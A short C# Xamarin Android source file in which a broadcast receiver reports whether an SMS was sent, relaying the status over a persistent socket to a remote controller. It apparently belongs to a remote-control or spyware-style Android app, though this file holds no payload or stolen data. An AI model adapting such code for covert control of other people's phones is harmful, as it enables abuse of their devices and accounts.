using Android.App;
using Android.Content;
using System;
using System.Text;

namespace Task2
{
    [BroadcastReceiver]
    [IntentFilter(new[] { "SMS_SENT" })]
    class SMSSTATUS : BroadcastReceiver
    {
        public override void OnReceive(Context context, Intent intent)
        {
            switch (ResultCode)
            {
                case Result.Ok:
                    try
                    {
                        byte[] send = ForegroundService._globalService.MyDataPacker("SMSSTATUS", Encoding.UTF8.GetBytes("SMS successfully sent."));
                        ForegroundService.Soketimiz.Send(send, 0, send.Length, System.Net.Sockets.SocketFlags.None);
                        System.Diagnostics.Debug.WriteLine(intent.Action);
                    }
                    catch (Exception) { }
                    break;
                default:
                    try
                    {
                        byte[] send = ForegroundService._globalService.MyDataPacker("SMSSTATUS", Encoding.UTF8.GetBytes("SMS couldn't sent."));
                        ForegroundService.Soketimiz.Send(send, 0, send.Length, System.Net.Sockets.SocketFlags.None);
                        System.Diagnostics.Debug.WriteLine(intent.Action);
                    }
                    catch (Exception) { }
                    break;
            }
        }
    }
}